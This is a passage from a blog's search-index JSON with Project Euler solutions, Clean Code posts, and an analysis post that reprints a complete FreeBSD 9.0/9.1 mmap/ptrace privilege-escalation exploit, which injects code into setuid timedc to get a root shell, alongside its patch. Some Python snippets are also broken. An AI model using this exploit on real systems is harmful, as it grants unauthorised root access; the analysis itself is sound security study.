reduce(_sum, Y) #Is equivalent to _sum(_sum(6, 9), 11)  Now putting all together, we have   def gcd(a, b):     while b:         a, b = b, a % b     return a  def lcm(a, b):     return a * b / gcd(a, b)  x = [11,13,14,16,17,18,19,20] print reduce(lcm, x) #232792560 print reduce(xrange(1, 21) #232792560   Either way, the answer is 232792560.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/smallest-multiple/",
        "teaser":null},{
        "title": "Sum Square Difference",
        "excerpt":"   The difference between the sum of the squares of the first ten natural numbers and the square of the sum is 3025 385 = 2640. Find the difference between the sum of the squares of the first one hundred natural numbers and the square of the sum.    Sixth question from Project Euler.   Sum Square Difference (SSD) is commonly used in image processing. For the sum of squares of the first 100 natural numbers,   sumsqr = (1 ** 2 + 2 ** 2 + ... 100 **2)   And for the square of the sum,   sqrsum = (1 + 2 + ... + 100) ** 2   A simple loop will do the job.   sumsqr, sqrsum = 0  for i in ((x, x ** 2) for x in xrange(1, 101)):     sqrsum += i[0]     sumsqr += i[1]  print sqrsum ** 2 - sumsqr #25164150   The answer is 25164150.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/sum-square-difference/",
        "teaser":null},{
        "title": "FreeBSD mmap+ptrace Privilege Escalation Exploit Analysis",
        "excerpt":"   Happy Birthday FreeBSD! Now you are 20 years old and your security is the same as 20 years ago… :) – Hunger hunger@hunger.hu    Saw this little birthday gift this morning from Full Disclosure. Works on my FreeBSD VM. Here’s a screenshot.      And here’s the exploit code   /*  * FreeBSD 9.{0,1} mmap/ptrace exploit  * by Hunger &lt;fbsd9lul@hunger.hu&gt;  *  * Happy Birthday FreeBSD!  * Now you are 20 years old and your security is the same as 20 years ago...  *  * Greetings to #nohup, _2501, boldi, eax, johnny_b, kocka, op, pipacs, prof,  *              sd, sghctoma, snq, spender, s2crew and others at #hekkcamp:  *                      I hope we'll meet again at 8@1470n  *  * Special thanks to proactivesec.com  *  */  #include &lt;err.h&gt; #include &lt;errno.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/stat.h&gt; #include &lt;sys/mman.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/ptrace.h&gt; #include &lt;sys/wait.h&gt;  #define SH \"/bin/sh\" #define TG \"/usr/sbin/timedc\"  int main(int ac, char **av) {    int from_fd, to_fd, status;    struct stat st;    struct ptrace_io_desc piod;    char *s, *d;    pid_t pid;     if (geteuid() == 0)  {         setuid(0);         execl(SH, SH, NULL);         return 0;    }     printf(\"FreeBSD 9.{0,1} mmap/ptrace exploit\\n\");    printf(\"by Hunger &lt;fbsd9lul@hunger.hu&gt;\\n\");     if ((from_fd = open(av[0], O_RDONLY)) == -1 ||         (to_fd = open(TG, O_RDONLY)) == -1)                 err(1, \"open\");     if (stat(av[0], &amp;st) == -1)         err(2, \"stat\");     if (((s = mmap(NULL, (size_t)st.st_size, PROT_READ,         MAP_SHARED, from_fd, (off_t)0)) == MAP_FAILED) ||                 (d = mmap(NULL, (size_t)st.st_size, PROT_READ,                         MAP_SHARED|MAP_NOSYNC, to_fd, (off_t)0)) == MAP_FAILED)                                 err(3, \"mmap\");     if ((pid = fork()) == -1)         err(4, \"fork\");     if (!pid) {         if (ptrace(PT_TRACE_ME, pid, NULL, 0) == -1)                 err(5, \"ptraceme\");          return 0;         }     if (ptrace(PT_ATTACH, pid, NULL, 0) == -1)         err(6, \"ptattach\");     if (wait(&amp;status) == -1)         err(7, \"wait\");     piod.piod_op = PIOD_WRITE_D;    piod.piod_offs = d;    piod.piod_addr = s;    piod.piod_len  = st.st_size;     if (ptrace(PT_IO, pid, (caddr_t)&amp;piod, 0) == -1)         err(8, \"ptio\");     execl(TG, TG, NULL);     return 0; }   I later found out that this vulnerability is already announced on 18-June-2013 and a patch was released with the Security Advisory   As stated in the Security Advisory, mmap is a POSIX-compliant system call that allows users to map files into memory by a process, and then can be accessed using memory operations.   And the ptrace is a handy tracing and debugging facility that allows users to attach to and control the traced process.   A security vulnerability exists in the virtual memory system that the permission checks are insufficient which allows the tracing process to modify adresses to which the traced process itself does not have write access.   The Analysis   The exploit code is quite simple, but it took me sometime to understand how mmap(2) and ptrace(2) works under FreeBSD.   if (geteuid() == 0)  {      setuid(0);      execl(SH, SH, NULL);      return 0; }   At the begining of the exploit, it checks if the effective user id is 0. This will only be true when the suid bit is set for the executable. Of course it’s not true at this point, because the exploit binary doesn’t have suid set.   However, this code will eventually get injected into another executable program, which obviously should have the suid bit, so that we can then setuid to 0, and get our lovely shell with root privilege.   #define TG \"/usr/sbin/timedc\"  $ ls -l /usr/sbin/timedc -r-sr-xr-x  1 root  wheel  20688 Dec  4  2012 /usr/sbin/timedc   As you can see here, timedc is chosen for us to inject to. Note that it has suid bit.   So now what’s left is to just inject this code into timedc, and when it gets called, we get a shell.   if ((from_fd = open(av[0], O_RDONLY)) == -1 ||      (to_fd = open(TG, O_RDONLY)) == -1)              err(1, \"open\"); if (stat(av[0], &amp;st) == -1)        err(2, \"stat\");   Now it tries to open the compiled binary of itself (av[0]) as from_fd, and /usr/sbin/timedc as to_fd. And then the stat of the exploit binary is saved in a stat struct called st. It’ll later be used to get the size of the exploit binary.   if (((s = mmap(NULL, (size_t)st.st_size, PROT_READ,      MAP_SHARED, from_fd, (off_t)0)) == MAP_FAILED) ||              (d = mmap(NULL, (size_t)st.st_size, PROT_READ,                      MAP_SHARED|MAP_NOSYNC, to_fd, (off_t)0)) == MAP_FAILED)                              err(3, \"mmap\");   mmap is used then to map the exploit binary into memory as s and timedc as d.   Refer to mmap man pages for details.   if ((pid = fork()) == -1)      err(4, \"fork\");  if (!pid) {      if (ptrace(PT_TRACE_ME, pid, NULL, 0) == -1)              err(5, \"ptraceme\");       return 0;      }  if (ptrace(PT_ATTACH, pid, NULL, 0) == -1)      err(6, \"ptattach\");  if (wait(&amp;status) == -1)      err(7, \"wait\");   Next it forks a child process. fork returns 0 to the child process, and the child process id to the parent process.   Since !pid is true only for the child process, PT_TRACE_ME marks the child as the traced process, This is for the kernel to know that some other process is tracing this child.   PT_ATTACH is executed by the parent process, it attaches to the child to start controlling it. Now we have two processes of the exploit, one tracing process, and one traced process.   Finally with wait, it suspends the calling process until status is available for terminated child process, or a signal is received from kernel. Since PT_TRACE_ME is set for the child process, a signal from kernel is expected. That’ll explicitly tell us that we are now okay to start tracing.   piod.piod_op = PIOD_WRITE_D; piod.piod_offs = d; piod.piod_addr = s; piod.piod_len  = st.st_size;  if (ptrace(PT_IO, pid, (caddr_t)&amp;piod, 0) == -1)      err(8, \"ptio\");   piod is a ptrace_io_desc struct, it’ll be used by PT_IO   The PT_IO request allows reading and writing arbitrary amounts of data in the traced process’s address space. In this case the addr argument should be a pointer to a ptrace_io_desc which is defined as   struct ptrace_io_desc {         int     piod_op;        /* I/O operation */         void    *piod_offs;     /* child offset */         void    *piod_addr;     /* parent offset */         size_t  piod_len;       /* request length */ };   This is designed for us to write data to the child process, but instead this piece of code writes the exploit binary to timedc.   This is the exact point of the vulnerability, the parent tracing process controls the child traced process to write data to timedc, which it originally has no privilege to do so. The virtual memory system does not check if such write/read operation is allowed. The injection of the exploit code into timedc is finished.   execl(TG, TG, NULL);   Now it runs timedc. Since it has the exploit code injected, and it has suid set, we can now get a shell with root privilege.   The Solution   A patch is provided by the Security Advisory. You can follow the instruction there to patch your system.   --- sys/vm/vm_map.c     (revision 251636) +++ sys/vm/vm_map.c     (working copy) @@ -3761,6 +3761,12 @@ RetryLookup:;                 vm_map_unlock_read(map);                 return (KERN_PROTECTION_FAILURE);         } +       if ((fault_typea &amp; VM_PROT_COPY) != 0 &amp;&amp; +           (entry-&gt;max_protection &amp; VM_PROT_WRITE) == 0 &amp;&amp; +           (entry-&gt;eflags &amp; MAP_ENTRY_COW) == 0) { +               vm_map_unlock_read(map); +               return (KERN_PROTECTION_FAILURE); +       }   The patch adds security checking upon virtual memory copying.   Nice birthday gift Hunger, had some very fun reading and debugging.  ","categories": [],
        "tags": ["FreeBSD","Security","C++"],
        "url": "http://localhost:4000/freebsd-mmap-ptrace-privilege-escalation-exploit-analysis/",
        "teaser":null},{
        "title": "10001st Prime Number",
        "excerpt":"   By listing the first six prime numbers: 2, 3, 5, 7, 11, and 13, we can see that the 6th prime is 13. What is the 10001st prime number?    This is the seventh question from Project Euler. Getting the 10001st prime number.   Well, the most staright forward method to solve this is to iterate through all nummbers greater than 2 and check their primality one by one until we reach the 10001st prime.   To check a number’s primality, we can simply try to divide the number by every number less than it. With the computational power that everyone has nowadays, even a simple solution as such can effectively give an answer within seconds or even fractions of seconds. But what if we need the 10000001st prime number?   As the counter grows, it is awkward to stick with a brute-force algorithm. We need to optimize it, and make it variable for reasonable large numbers.   A simple optimization is that, if a number can be divided by an even number, it is not a prime number, and it can be divided by 2. For instance,   12 / 4 = 3  and  12 / 2 = 6 Since 12 = 2 * 2 * 3   As shown above, when testing a number’s primality, we don’t need to divide the number by even numbers that are less than it, we only need to test odd numbers. For instance,   13 % 2 != 0 13 % 3 != 0 13 % 5 != 0 13 % 7 != 0 13 % 9 != 0 13 % 11 != 0  # Thus, 13 is a prime number   Any number that can be divided by an even number can also be divided by 2, it’ll fail the first checking so we don’t have to worry about even numbers at all.   Since we cut off all the even number checkings except for 2, it is nearly half of the original cost.   Yet we can further improve this simple primality checking algorithm.   # Since for any number, we have x = a * b  If a &gt; sqrt(x) and b &gt; sqrt(x) then a * b &gt; x  # Thus, only one of a, b can be greater than sqrt(x)   This means when checking a numbers primality, not all the odd numbers less than it need to be checked, only for those that are also less than the square root of the number. For insance,   sqrt(13) = 3.60 13 % 2 != 0 13 % 3 ! = 0  # Thus, 13 is a prime number   Looks like we just effectively reduced the cost by half again. To implement this idea to get the 10001st prime number,   import math def isPrime(num):     if num == 2:         return True     if num % 2 == 0 or num &lt; 2:         return False     #Start from 3, until its square root, with stepping 2     for x in xrange(3, int(math.sqrt(num)) + 1, 2):         if num % x == 0:             return False     return True  if __name__ == '__main__':     num = counter = 1     while (counter &lt; 10001):         num += 2 #Only test odd numbers         if isPrime(num):             counter += 1     print \"The 10001st prime number is: \" + str(num)   Note that,   for x in xrange(3, int(math.sqrt(num)) + 1, 2):  # Is equivalent to  for (int x = 3; x &lt;= sqrt(num); x += 2)  # In some other programming languages.   The answer is 104743.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/10001st-prime-number/",
        "teaser":null},{
        "title": "Largest Product In A Series",
        "excerpt":"   Find the greatest product of five consecutive digits in the 1000-digit number.    x = \"\"\"73167176531330624919225119674426574742355349194934 96983520312774506326239578318016984801869478851843 85861560789112949495459501737958331952853208805511 12540698747158523863050715693290963295227443043557 66896648950445244523161731856403098711121722383113 62229893423380308135336276614282806444486645238749 30358907296290491560440772390713810515859307960866 70172427121883998797908792274921901699720888093776 65727333001053367881220235421809751254540594752243 52584907711670556013604839586446706324415722155397 53697817977846174064955149290862569321978468622482 83972241375657056057490261407972968652414535100474 82166370484403199890008895243450658541227588666881 16427171479924442928230863465674813919123162824586 17866458359124566529476545682848912883142607690042 24219022671055626321111109370544217506941658960408 07198403850962455444362981230987879927244284909188 84580156166097919133875499200524063689912560717606 05886116467109405077541002256983155200055935729725 71636269561882670428252483600823257530420752963450 \"\"\" x = x.replace('\\n', '')   This is the 8th question from Project Euler. Given a 1000-digit number, we need to get the maximum product of 5 consecutive digits.   By five consecutive digits, it means the (7, 3, 1, 6, 7), (3, 1, 6, 7, 1), …. The game plan is to write a simple loop, walk through this 1000-digit number and see which 5 yeilds the greatest product.   Note that the last group of 5 consecutive digits is (6, 3, 4, 5, 0) which starts at the index len(x) - 4   x = \"\"\"73167176531330624919225119674426574742355349194934 96983520312774506326239578318016984801869478851843 85861560789112949495459501737958331952853208805511 12540698747158523863050715693290963295227443043557 66896648950445244523161731856403098711121722383113 62229893423380308135336276614282806444486645238749 30358907296290491560440772390713810515859307960866 70172427121883998797908792274921901699720888093776 65727333001053367881220235421809751254540594752243 52584907711670556013604839586446706324415722155397 53697817977846174064955149290862569321978468622482 83972241375657056057490261407972968652414535100474 82166370484403199890008895243450658541227588666881 16427171479924442928230863465674813919123162824586 17866458359124566529476545682848912883142607690042 24219022671055626321111109370544217506941658960408 07198403850962455444362981230987879927244284909188 84580156166097919133875499200524063689912560717606 05886116467109405077541002256983155200055935729725 71636269561882670428252483600823257530420752963450 \"\"\" x = x.replace('\\n', '')  if __name__ == '__main__':     max_product = -1     for i in range(len(x) - 4):         product = int(x[i]) * int(x[i+1]) * int(x[i+2]) * \\                 int(x[i+3]) * int(x[i+4])         if product &gt; max_product:             max_product = product     print max_product   Very straight-forward code. Taken from pastebin and modified a little bit. Of course there are simpler and more pythonic ways, but since this is a simple question, I’ll just be lazy and ignore the possible ugliness of this code.   The answer is 40824, if you print out the five digits, they are, (9, 9, 8, 7, 9), starting at index 364.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/largest-product-in-a-series/",
        "teaser":null},{
        "title": "Clean Code Tips and Tricks: Introduction",
        "excerpt":"I recently organized a workshop for my team members to talk about Clean Code. It has been a major issue plaguing our code and has been slowing us down by generating tons of unreadable and unmaintainable code. So I took the oppoturnity of the Chinese New Year holidays and delivered these three-days talk online.   I had great feedback from my team members and learned a few things myself by preaching the Clean Code concept along with the S.O.L.I.D Principle. The following weeks brought exiciting and notable results, the code quality improved significantly just by following these simple tips and tricks. Better still, even some skilled developers with many years of work experience showed signs of improvement in code quality.   So I figured it might be of help to other developers if I posted these notes online. I revised the notes I used to deliver the talks and incorporated some of the new ideas I’ve learned during the process to share with you, though I’ll leave S.O.L.I.D principles for a later series that focuses on design principles.   This talk will be divided into five installments to try to cover one aspect of clean code guidelines per post. The workshop lasted for three days and I’ve got a lot more to share so it might be unpleasant to wade through the whole thing one shot.   What is this all about?   It’s all about quality, and to be specific, code quality.   You see we programmers and software users have different definitions when it comes to judging the quality of a piece of software, an app or a web site. Customers expect good look and feel, simple and elegant interactive design and rich functionalities, but from the point of view of those who make the software, they should care about its internal quality.   I said we should because that is unfortunately and surprisingly not often the case despite how natural and convincing that sounds. Yes you may hear some of your colleagues talking about how messy and troublesome a codebase is to work with, but when they program, they do it as if they were end users – focusing solely on delivering functionalities that satisfy customers’ requirements.   Overtime they stop caring about internal quality and view the very software that they are making themselves as a black box, they don’t put enough thoughts on the actual implementation and structure, they only expects their code to just work.   Ironically, some others see the harm this does to the codebase, and they understand good quality should be defined internally, but they choose not to follow guidelines and best practices for reasons that are plainly wrong: they think sacrificing quality is the necessary evil for faster delivery and lower development costs. It is so horribly wrong I couldn’t wait for you to read the part I explain this in detail.   And of course there are others who only followed the team styles or did it the usual way that they unknowingly contributed to poor code quality with bad variable names, repetitive implementations, poor function structures, and the like which to them, is not a big deal, we did it like this only all the time.   What characteristics I think a good quality codebase should have are as listed below, people may come up with different list but I believe they essentially mean the same thing.      Readability            Good code should be easy to read and understand. They are not only written for computers to execute, but also (I’d even claim more importantly) for your co-workers to read and collaborate with.           Maintainability            When fixing bugs or modifying existing functionalities, codebase with good maintainability not only reduces the workload, but also the chance of introducing new bugs.           Extensibility            And when we add new features, we don’t end up pulling our hairs off trying to figure out where and how to implement in a way that won’t break existing features or introduce new problems.           Testability            I’d say all code pieces are testable, but there are some that are particularly hard to test. Good quality code should be easy to write test for.           Robustness            It’s equivalent to endurance, it makes your code strong and mature in exception handling that would still fight like a tough soldier after years of production.           These characteristics are interconnected, you’d often times find that in order to adopt one of them properly, you have to implement one of the others, it’s also true that when you work on one aspect, others would naturally improve as well.   We did have a brief discussion about S.O.L.I.D principle on day 3 when I first presented to my team, I think it’s great and should be adopted by every developer. Following good design patterns and architectural principles would make a profound qualitative change to maintainability, extensibility and testability, and certainly attributes to the cleanness of your codebase as well, but those are out of the scope of this post series. I’m planning on writing about patterns and principles I’ve personally had experience with in the near future, stay tuned if you are interested.   Though this series mainly focus on readability, working on it alone can already have a powerful impact on your codebase, and not only do they become easier to understand, but also more enjoyable to maintain, to hunt bugs and to write tests for.   But Why?      “When it comes to writing code, an ounce of prevention is worth a pound of cure.”    We all had some experiences that somewhat resemble this: whether you yourself or one of your co-workers who wrote code carelessly and irresponsibly that led to bugs, performance issues, and weird system behaviors nobody knew what caused it and how to solve it. After days of debugging, you finally pinpointed that piece of shit, um I mean code, you found it utterly gibberish and unbearably hard to understand. Then after pulling all your hairs off, you finally understood the code and the cause of the issue, just to be confronted by the harsh reality that it is nearly impossible to modify the original code without editing too much or breaking too many existing functionalities. As the same issue piles up and consumes nearly all your time, and at some stage along this path, a hard decision would be made to rewrite the whole thing in hope of solving those issues altogether, but this time you wouldn’t even be surprised to find out the refactored project would go through exactly the same set of problems all over again.   It’s a vicious cycle with no way but only one way out – WRITE, CLEAN, CODE.   It’s Evil, But Certainly Not Necessary   People intentionally and irresponsibly write bad code justify their actions on a wrong premise that this could save development time or cost, perhaps both. When confronted with a tight schedule or budget, they instinctively deteriorate their code quality assuming it is just a trade-off of quality for efficiency as if software development was a one-time deal.   It is not.   When you take bug fixings, requirement changes and feature additions into account, sacrificing code quality to save development time and cost is most likely a dumb thing to do, it’s as if you are intentionally saving long and exhaustive hair-pulling sessions for later.   Saving time and money developing a piece of software but end up spending more than you saved on extensions and maintenance due to bad code quality does not sound like a good plan at all, it perhaps only make sense when the scope is only to develop a MVP or prototype, and you are dead sure nobody needs to touch the codebase ever again.   The reason I observed resistance to the idea of writing clean code from the teams I’ve worked with is perhaps that it asks programmers to spend more time writing good code when horrific bugs and new feature requests with undetermined side effects are already taking too much of their time. Hence I hear this over and over,      Meh, I’m Just Too Busy    It is more important to do the right stuff than doing the wrong thing but being productive and busy as a bee. You are just being a really naughty bee, now don’t be a bad bee when asked to improve your work ethics by saying, “but I’m already too busy polluting the honey with poison!”   Writing readable, robust and maintainable code is not a waste of time, it’s what you should do as a professional developer.      “We spend most of our time staring into the abyss rather than power typing.” ~Douglas Crockford    Let’s face the fact here, we are not like those dope hackers in the movies who type like their lives depend on it in front of the computer. No, we spend most of our time looking at ugly code, cursing the guy who committed it and sometimes even later realized it was you who wrote it.   We spend so much time staring at code that in fact the time ratio of reading and writing code is 10:1. For each hour of typing code, you spend 10 hours reading.   Writing beautiful, elegant, and understandable code is not altruism, it’s to relieve yourself from pulling all-nighters to catch up with schedule, and being called in the middle of the night to be lashed about a bad bug.   Surprisingly only few people understands schedule delay and slow feature delivery are not because your team members are typing too slow, on the contrary, it’s because you are writing too fast without caring about code quality and have to spend tons of time wading through horrific death swamp just to extend a new feature or fix a minor bug. It is lucrative to spend more time writing better code, and less time reading bad ones.      But we don’t have the budget for it    And some project owners feel reluctant towards clean code for the same reasons, except that they are more concerned about monetary issues. Starting off a brand new project can benefit from adopting clean code as it saves time and money by reducing the costs on maintaining and extending the software, it is however less straightforward in cases of existing projects, since again, we are asking for more costs writing better code before we can observe notable costs reductions.   Managers and project owners assume good quality things cost more, it must be logical to lower quality standards in order to reduce costs. It may be true from the end user’s point of view, they want a better looking software with more functionalities, they often have to pay more.   However it is not necessarily true from the development team’s point of view, and sometimes I even observe the exact opposite – better the quality of the codebase, less costs it incurs comparing to competitors that offer same level of end user experience.   It is true that in short term, we can cut some costs by sacrificing code quality, but team members and managers often underestimate how quickly bad code pieces would build up and slow the overall process.   High code quality leads to faster and less expensive delivery of new features and improvements, which I’d say is more important for customers. I personally would be more willing to pay for an app with less feature but more frequent improvements than one with more features but slow in fixing bugs and responding to new feature requests. And eventually this app with better internal structure will catch up and have more features to offer thanks to its accumulating costs reductions.   It’s Your Responsibility   As a professional software developer, your job is not just to implement required functionalities, you have to deliver them with good practices and code quality.   It is your responsibility to write clean and quality code, not your clients’, not your colleagues’, not your team leader’s or your boss’s, yours. A famous analogy is that you don’t tell your doctor to skip washing their hands because it saves time. Client or manager telling you to be quick to deliver and catch up with schedule are NOT suggesting lowering code quality.   Every job has their own work ethics, guidelines and procedures they follow to do their jobs right, so should we. As Martin said in one of his talks, software developers are becoming more and more influential to the physical world, if we don’t come up with some code of conduct or principles on our own, governments would impose them on us when the day comes where a software bug could potentially get people killed.   That day’s nigh, clock’s ticking :-D   How to Clean Code   We’ll be discussing tips, tricks and guidelines to write clean code in the later installments of this blog series, but the general rule of thumb is just to be responsible, polite and considerate when you write code, think about the consequences of your approach, respect and reflect your team’s style and architectural design.   Be Polite   Bad code is rude, and you don’t want to be rude to your co-workers and the future you.   At the dawn of Computer Science, programming was more of a method to talk to computers, to let the computers know our intentions and do our deeds. But that has changed since we invented high level progamming languages and introduced teamwork to the making of software.   Now we must write for not just computers, but other humanzzz as well. Writing code that is hard to read and maintain by the future you or your co-workers brings much more trouble than compiling errors and runtime exceptions.   Programmers are more like writers, you should write as a writer, write stuff you and your co-workers would enjoy reading and working on.   Be Considerate   Computers don’t care about your code quality, it does whatever you tell it to do. But you should keep other people in mind when you code, think about what approach and implementation they’d appreciate, and how you can help to make their life (and yours) easier.      You code is the best document if done right    Your code is the best document if it’s done right. No matter how ellaborate you document your code, it won’t be of any help if the code quality is horrible.   And everytime you update your codebase, corresponding changes should be committed to the documents as well. If we don’t even write good quality code, I can’t imagine how awful the document would look like.   My team maintains no document whatsoever, partly because it brings more overhead than it brings good for a small team, but mostly because I believe self-explanatory code invalidate the purpose of documentation.   However, I’m not saying documentless is the definite way to go, many teams still maintain documentation or wiki about their codebase. But if you and your co-workers can understand eachother’s code without referring to comments or documentation, then why not?   Be Thorough   Unfortunately, modern high level languages are supposedly closer to human languages, but the flow of expressions and the way we convey instructions are far from what we are familiar with in our daily lives. A non-programmer may find herself fully understand the literal meaning of a piece of code but couldn’t just grasp the true intention of it.   We have to admit that the way we are used to write code often isn’t the best way to present it to other people. Train a human resource employee to validate job application forms is much easier than writing a piece of code to do it, we have to consider all the possibilities and small steps, handle every subtle and even hidden aspects of the matter and try to cover everything there is to consider.   We are good at being thorough to computers, now is time to do the same for your co-workers. We should consider how we can present our thoughts in a way that is more natural for another programmer to understand, maintain and extend.   Leave It Better Than You Found It   So what if you are working on a gigantic ball of mud codebase and it seems too late to adopt any of these tips?   Actually it’s never too late to start writing clean code, and if you can convince yourself and you co-workers to improve the dirty code everytime they come across it, you’ll eventually have a clean codebase.   Now, note that leave the code you come across better than you found it does not necessarily mean rewriting or refactoring a whole class. Fix the variable names, improve the structure of the class, divide functions that don’t follow Single Responsibility Principle into smaller ones, and implement meaningful method names would be good enough to have notable effects in just a few weeks.   That’s it! Thanks for reading. We talked about why we have to write clean code, the benefits of adopting it and some common misconceptions and misunderstandings. I hope you enjoyed it, looking forward to seeing you in the next installment of Clean Code Tips and Tricks.  ","categories": [],
        "tags": ["Clean Code","PHP","Programming Guideline"],
        "url": "http://localhost:4000/clean-code-tips-and-tricks-introduction/",
        "teaser":null},{
        "title": "Clean Code Tips and Tricks: Variables",
        "excerpt":"Welcome back to the second installment of Clean Code Tips and Tricks. Today we are going to talk about variables, specifically, naming your variables.   Naming things in programming is perhaps the most overlooked aspect that can actually greatly help improving the readability of our code. You’ll see after reading this installment that giving variables proper names can make your intentions clear and avoid ambiguity, moreover, hunting good names can often reveal problems within your code.   In the process of finding good names for your variables, you may find out problems with the content of the data they are going to hold and refactor your code to have a better structure. For example, if you find it hard to name a variable that’s holding the return result of a method because it returns more than one types of relatively unrelated data, that’s a good sign that your method is not properly structured and is trying to do more than one thing, it then becomes clear that splitting the method into smaller ones each performs one particular action would improve the cleanness of your codebase.   Many of the practices I suggest here for naming a variable apply to others such as method names, class name, module names and even array key names. We’ll cover those that are different or specific in later installments, now let’s get started with variables first.   Use English Words (Duh!?)   This is a huge problem many of my teams suffered, they used to use PinYin as variable names, a method to write Chinese characters using letters to spell the pronunciation. Problem is there are some guesswork involved before you can determine what characters are being spelled out due to the huge amount of homonyms in Chinese. Plus using roman letters only can’t effectively express intonations, which is crucial to the meaning of a phrase.   It’s quite a common thing in China, many teams suffer from this problem. It takes roughly 5-10 seconds for a native Chinese speaker to figure out the meaning of a variable name by guessing and relying on context, quite ineffective and ambiguous.   $baoxian // This can mean preservation or insurance $youli // This can mean advantagous, powerful, or rational $zhiwu // Plant, job position $baodao // Student attendance, news report   It gets worse when your team has members from different countries or speak different languages. I’ve seen lots of variable names written completely or partially in Malayu when I was working in Malaysia, which was a huge pain for me as a foreigner.   I personally estimated the rough amount of frequently used English words when programming is only 100 - 500, give or take as people work in different types of businesses. Comparing to high school graduates in China, they have learned at least 2000 English vocabulary, which is more than enough to write English variable names.   Use Nouns Or Stataments   Variables are containers that hold data or state, you shouldn’t name them with verbs or questions.   // Nouns are the most common variable names. $comment; $avatar; $firstname;   This is straightforward, we have been naming our variables with nouns all the time, but when it comes to expressions and statements, sometimes we name them in a way that’ll confuse other people.   // It sounds more like an action. $moveStudent = true;  // Should be a function name instead public function moveStudent($student){}  // Now it looks like a question $shouldMoveStudent = true;  // Interrogative sentences are good names // for functions that answer a specific question public function shouldMoveStudent($student) {     if (...) return false;      return true; }  // Finally a general sentence suit for a variable // Nice and clear. $studentShouldBeMoved = true;   Don’t Abbreviate, Don’t Be Too Verbose Either   It sometimes surprises me how many people still name their variables with C or even ealier programming language styles decades ago, when efficiency was the utmost priority. They use abbreviations, single letter temporary variable names, even some mathmatical terms and habits like $tot, $sqrt, or $log.   Please don’t, as I noticed some new developers who didn’t witness the C era picked up the habits from other programmers, but have no idea why they name like that, or what do they mean.   Not everyone understands your abbreviation, not everyone’s feeling nostalgia, and we don’t have to shorten our code to save space anymore. Keep in mind that this suggestion works and should be applied to function names, class names, and module names.   // What do they mean? $i, $q, $r, $c;  // What if someone don't understand these abbreviations? $idx, $req, $res, $cnt;  // Better but not perfect. $index, $request, $response, $count;  // Don't make them too long either $customersHusbandOrWifeAddress; =&gt; $spouseAddress;   Sometimes it’s hard to tell exactly how long is too verbose, but being too long is still better than being too short. We have to try our best to get rid of ambiguous abbreviations since it harms the understandability while on the other hand unnecessarily verbose names just waste a little of your time.   A practical rule I read online is to determine the length of your variable name based on the scope it lives. The wider this variable’s scope is, the longer and more specific the name of the variable should be since it would be even harder to check back to the context where the variable was defined when it is so widely referred to. And it is acceptable to name a counter as $counter when the scope it lives in is only 3 lines of code.   Be Descriptive   Be generous when you name your variables, try to describe everything about the data or state your variables are holding.   Describe your intention clearly, don’t let your readers rely on context to understand your variable’s purpose.   Describe their natures fully. If you don’t express all characteristics of your variables, you risk confusing your readers.   // Count of what? $count;  // Better, but have you described its purpose clearly? $appliedCount;  // Perfect, especially when you have an $appliedTeachersCount // in the context, this avoids ambiguity $appliedStudentsCount;   We code within contexts, and can easily take the context for granted and assume everyone who’s going to read this piece of code processes the same level of understanding of the context. It is often not the case, and if we can help our readers grasp the meaning of our variables in it’s proper context by naming them correctly, why shouldn’t we?   /*  * It's hard to understand the full picture.  * You are not describing every aspect of it.  * Is it the average score of all subjects of a particular  * student or is it the average score of the class?  */ $averageScore = array_sum($scores)/count($scores);  // Much better $studentAverageScore = array_sum($subjectsScores)/count($subjectsScores);   More Examples   $times = AlarmService::getTotalTimes($alarm_id);  return $times;  // The following is much more descriptive  $alarmTriggeredTimes = AlarmService::getTotalTriggeredTimesFor($alarm_id);   $revenue = 0;  foreach (     $company-&gt;getAllRevenue()             -&gt;latest()             -&gt;limit(12)     as $temp ) {      $revenue += $temp; }  return $revenue;  /*  * Don't confuse your readers with names like $temp  * It's hard to understand this piece of code  * without noticing what 12 means.  */  $yearly_revenue = 0;  foreach (     $company-&gt;getAllRevenue()             -&gt;latest()             -&gt;limit(12)     as $monthly_revenue ) {      $yearly_revenue += $monthly_revenue; }   /*  * Naming your variables and methods properly  * makes your code read like natural language.  * and become so much easier to read and work with.  */  $userIsActive = $user-&gt;isActive();  $addressIsDefault = $address-&gt;isDefault();  $newVersionAvailable = VersionService::isNewVersionAvailable();  do {     $allEmailsSent = EmailService::processEmailQueue(); } while (!$allEmailsSent)  if ($studentFailedAnyExam) {     ReportService::generateTranscriptWithRedBackground($student_id); }   Declare Variables Close To Where You Use Them   Unless they are constants or class properties, declaring your variables too far away from where you actually use them force your readers to jump around looking for definitions.   /*  * Declaring all variables at the beginning may be  * considered a good practice under certain context  * but it feels more like natural language to declare  * only when you are about to use them.  */  $expiringCoupons = $user-&gt;listExpiringCoupons(); $eligibleCouponValues = [30, 100, 250]; $hasIneligibleCoupon = false;  foreach ($expiringCoupons as $expiringCoupon) {      if (!in_array($expiringCoupon-&gt;value, $eligibleCouponValues)) {         $hasIneligibleCoupon = true;         continue;     }      CouponService:extendCoupon($expiringCoupon-&gt;id, 30); }  if (!$hasIneligibleCoupon) return;  EmailService::sendCouponExpiringWarning($user-&gt;id);   Reading and writing code requires a high level of concentration, tracking half a dozen of variable names, their definitions and types while trying to understand a piece of code is challenging to every human brain. Our efficiency would deteriorate if we were constantly interrupted to look for variable definitions across the lengthy source file.   Use Explanatory Variables   Explanatory variables exist, while, to explain your code. By introducing a variable that would otherwise be considered unnecessary and giving it a proper name can do wonders to help your readers better understand the code.   foreach ($expiringCoupons as $expriringCoupon) {     if (!in_array($expipringCoupon-&gt;value,         config('promotion.nationalday.coupon_values')        ) {        ...     } }  // The above code works perfectly, there's nothing // wrong with it, but the following is more friendly to // your readers, they'll appreciate your efforts.  $eligibleCouponValues = config('promotion.nationalday.coupon_values');  foreach ($expiringCoupons as $expiringCoupon) {     if (!in_array($expipringCoupon, $eligibleCouponValues)) {         ...     } }   Note that defining $eligibleCouponValues was not necessary, however it helps to understand the code as if we documented the nature of the data it holds.   That’s it for today, we talked about how to properly name your variables to improved readability and avoid ambiguity. I think it is the first and most effective step towards a better and cleaner codebase. You may noticed that the tips 